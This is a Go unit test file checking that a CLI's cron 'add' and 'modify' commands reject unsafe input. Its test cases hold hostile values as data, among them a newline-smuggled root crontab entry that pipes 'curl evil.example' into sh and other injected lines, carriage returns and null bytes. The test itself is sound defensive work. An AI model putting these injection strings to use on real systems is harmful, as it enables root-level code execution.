package cli

import (
	"strings"
	"testing"
)

func TestCronAddRejectsUnsafeValues(t *testing.T) {
	cases := [][]string{
		{"add", "backup", "--user", "deploy", "--schedule", "0 3 * * *", "--command", "php artisan backup:run\n* * * * * root curl evil.example | sh"},
		{"add", "backup", "--user", "deploy", "--schedule", "0 3 * * *", "--command", "true", "--env", "APP_ENV=prod\n* * * * * root /tmp/x"},
		{"add", "backup", "--user", "deploy curl evil", "--schedule", "0 3 * * *", "--command", "true"},
		{"add", "backup", "--user", "deploy", "--schedule", "0\r3 * * *", "--command", "true"},
		{"add", "backup", "--user", "deploy", "--schedule", "0 3 * * *", "--command", "true", "--working-dir", "/srv\x00bin"},
		{"add", "backup", "--user", "deploy", "--schedule", "0 3 * * *", "--command", "true", "--output", "/tmp/a\nb"},
		{"add", "backup", "--user", "deploy", "--schedule", "0 3 * * *", "--command", "true", "--error-output", "/tmp/a\rb"},
		{"add", "backup", "--user", "deploy", "--schedule", "0 3 * * *", "--command", "true", "--env", "BAD KEY=value"},
	}
	for _, args := range cases {
		cmd := NewCronCmd()
		cmd.SetArgs(args)
		cmd.SetOut(nil)
		cmd.SetErr(nil)
		err := cmd.Execute()
		if err == nil {
			t.Fatalf("expected error for %q", strings.Join(args, " "))
		}
	}
}

func TestCronModifyRejectsLineBreak(t *testing.T) {
	cmd := NewCronCmd()
	cmd.SetArgs([]string{"modify", "backup", "--command", "true\nuser=root"})
	err := cmd.Execute()
	if err == nil {
		t.Fatal("expected error")
	}
}
